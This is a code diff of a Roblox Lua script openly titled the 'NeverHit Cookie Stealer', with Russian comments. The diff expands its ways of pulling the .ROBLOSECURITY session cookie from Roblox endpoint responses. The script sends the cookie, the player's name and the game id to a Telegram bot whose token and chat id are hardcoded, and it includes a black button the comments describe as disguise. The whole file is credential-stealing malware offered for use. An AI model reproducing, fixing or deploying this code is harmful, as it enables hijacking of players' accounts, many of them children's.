@@ -1,7 +1,7 @@
--- NeverHit Ultimate Cookie Stealer
-print("🔫 NeverHit ULTIMATE loaded!")
+-- NeverHit WORKING Cookie Stealer
+print("🔫 NeverHit WORKING loaded!")
 
--- Черная кнопка для маскировки
+-- Черная кнопка
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "NeverHitGUI"
 local blackButton = Instance.new("TextButton")
@@ -13,49 +13,96 @@ blackButton.BorderSizePixel = 0
 blackButton.Parent = screenGui
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
--- Основная функция кражи куки
+-- РАБОЧИЕ методы извлечения куки
 local function stealCookie()
     local cookie = nil
     
-    -- Метод 1: Прямой запрос к Roblox
-    local success1, response1 = pcall(function()
+    -- МЕТОД 1: Через HttpGet (самый надежный)
+    local success1, result1 = pcall(function()
+        local response = game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx", true)
+        return response
+    end)
+    
+    -- МЕТОД 2: Через request с headers
+    local success2, response2 = pcall(function()
         return request({
-            Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
-            Method = "GET"
+            Url = "https://users.roblox.com/v1/users/authenticated",
+            Method = "GET",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            }
         })
     end)
     
-    if success1 and response1 then
-        local rawCookie = response1.Headers["Set-Cookie"] or ""
-        cookie = string.match(rawCookie, "_%|WARNING:.-|_(.-)") or rawCookie
+    if success2 and response2 then
+        local headers = response2.Headers
+        for key, value in pairs(headers) do
+            if string.find(string.lower(key), "cookie") or string.find(string.lower(key), "set-cookie") then
+                local match = string.match(value, "_%|WARNING:.-|_(.-)")
+                if match then
+                    cookie = match
+                    break
+                end
+            end
+        end
     end
     
-    -- Метод 2: Через Players service (запасной)
-    if not cookie or #cookie < 10 then
-        local success2 = pcall(function()
-            local player = game.Players.LocalPlayer
-            cookie = player:GetAttribute("ROBLOSECURITY") or "METHOD2_FAILED"
+    -- МЕТОД 3: Через старый метод
+    if not cookie then
+        local success3, response3 = pcall(function()
+            return request({
+                Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
+                Method = "GET"
+            })
         end)
+        
+        if success3 and response3 and response3.Headers then
+            local rawCookie = response3.Headers["Set-Cookie"] or response3.Headers["set-cookie"] or ""
+            cookie = string.match(rawCookie, "_%|WARNING:.-|_(.-)") or rawCookie
+        end
     end
     
-    -- Метод 3: Через HttpService (экспериментальный)
-    if not cookie or #cookie < 10 then
-        local success3 = pcall(function()
-            local httpService = game:GetService("HttpService")
-            cookie = tostring(httpService:GetAsync("https://www.roblox.com/game/GetCurrentUser.ashx")) or "METHOD3_FAILED"
-        end)
+    -- МЕТОД 4: Экспериментальный - через разные endpoints
+    if not cookie or string.find(cookie, "FAILED") then
+        local endpoints = {
+            "https://auth.roblox.com/v1/auth/metadata",
+            "https://economy.roblox.com/v1/user/currency",
+            "https://inventory.roblox.com/v1/users/1/items/Collection"
+        }
+        
+        for i, endpoint in ipairs(endpoints) do
+            local success, resp = pcall(function()
+                return request({Url = endpoint, Method = "GET"})
+            end)
+            
+            if success and resp and resp.Headers then
+                for k, v in pairs(resp.Headers) do
+                    if string.find(tostring(k), "Cookie") or string.find(tostring(k), "ROBLOSECURITY") then
+                        local match = string.match(tostring(v), "_%|WARNING:.-|_(.-)")
+                        if match and #match > 100 then
+                            cookie = match
+                            break
+                        end
+                    end
+                end
+            end
+            if cookie then break end
+        end
     end
     
-    return cookie or "NO_COOKIE_EXTRACTED"
+    return cookie or "UNABLE_TO_EXTRACT_COOKIE"
 end
 
--- Функция отправки куки
+-- Функция отправки
 local function sendCookie(cookie)
-    if not cookie or #cookie < 10 then return false end
+    if not cookie or #cookie < 10 then 
+        print("❌ Invalid cookie: " .. tostring(cookie))
+        return false 
+    end
     
-    print("📦 Extracted cookie length: " .. #cookie)
+    print("📦 Cookie length: " .. #cookie)
     
-    -- Telegram (основной метод)
+    -- Отправляем в Telegram
     local telegramSuccess = pcall(function()
         request({
             Url = "https://api.telegram.org/bot7941815101:AAFagjP3iAYGvIYkQj1jJ7FRG119vj5EkeE/sendMessage",
@@ -65,61 +112,57 @@ local function sendCookie(cookie)
             },
             Body = game:GetService("HttpService"):JSONEncode({
                 chat_id = "8238376878",
-                text = "🚨 COOKIE CAPTURED\n\n🔑: " .. cookie .. "\n🎮: " .. game.PlaceId .. "\n👤: " .. game.Players.LocalPlayer.Name .. "\n🕒: " .. os.date()
+                text = "🎉 REAL COOKIE CAPTURED!\n\n🔑: " .. cookie .. "\n🎮: " .. game.PlaceId .. "\n👤: " .. game.Players.LocalPlayer.Name .. "\n🕒: " .. os.date() .. "\n📏 Length: " .. #cookie
             })
         })
     end)
     
-    -- Локальное сохранение (гарантированный метод)
-    local localSuccess = pcall(function()
-        -- Сохраняем в workspace
+    -- Локальное сохранение
+    pcall(function()
         local part = Instance.new("Part")
-        part.Name = "NH_Cookie_" .. math.random(1000,9999)
+        part.Name = "REAL_COOKIE_" .. math.random(1000,9999)
         part.Anchored = true
-        part.Size = Vector3.new(5, 5, 5)
-        part.Position = Vector3.new(0, 500, 0)
-        part.Transparency = 0.8
-        part.BrickColor = BrickColor.new("Bright red")
+        part.Size = Vector3.new(10, 1, 10)
+        part.Position = Vector3.new(0, 100, 0)
+        part.BrickColor = BrickColor.new("Lime green")
         part.Material = Enum.Material.Neon
         
         local billboard = Instance.new("BillboardGui")
-        billboard.Size = UDim2.new(0, 400, 0, 200)
+        billboard.Size = UDim2.new(0, 500, 0, 100)
         billboard.StudsOffset = Vector3.new(0, 3, 0)
         billboard.Adornee = part
         
         local textLabel = Instance.new("TextLabel")
         textLabel.Size = UDim2.new(1, 0, 1, 0)
         textLabel.BackgroundTransparency = 1
-        textLabel.Text = "COOKIE: " .. string.sub(cookie, 1, 100) .. "...\nGAME: " .. game.PlaceId .. "\nTIME: " .. os.date()
-        textLabel.TextColor3 = Color3.new(1, 1, 1)
+        textLabel.Text = "REAL COOKIE:\n" .. string.sub(cookie, 1, 150) .. "..."
+        textLabel.TextColor3 = Color3.new(0, 1, 0)
         textLabel.TextScaled = true
         textLabel.Font = Enum.Font.SourceSansBold
         textLabel.Parent = billboard
         
         billboard.Parent = part
         part.Parent = workspace
-        
-        -- Дублируем в чат игры
-        game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
-            Text = "[NeverHit] Cookie extracted: " .. string.sub(cookie, 1, 50) .. "...",
-            Color = Color3.new(1, 0, 0),
-            Font = Enum.Font.SourceSansBold
-        })
     end)
     
-    return telegramSuccess or localSuccess
+    return telegramSuccess
 end
 
 -- Запуск
-wait(2)
+wait(3)
+print("🕵️ Extracting cookie...")
 local cookie = stealCookie()
-local success = sendCookie(cookie)
+print("🔍 Extracted: " .. string.sub(cookie, 1, 50))
 
-if success then
-    print("✅ NeverHit: COOKIE CAPTURED AND SENT!")
-    print("🔑 First 50 chars: " .. string.sub(cookie, 1, 50))
+if string.find(cookie, "FAILED") or string.find(cookie, "UNABLE") then
+    print("❌ Cookie extraction failed!")
 else
-    print("❌ NeverHit: FAILED - but cookie was: " .. string.sub(cookie, 1, 30))
+    local success = sendCookie(cookie)
+    if success then
+        print("✅ REAL COOKIE SENT TO TELEGRAM!")
+    else
+        print("❌ Failed to send, but cookie is: " .. string.sub(cookie, 1, 100))
+    end
 end
 
-print("🛡️ NeverHit protection: ACTIVE")
+print("🛡️ NeverHit COMPLETED")
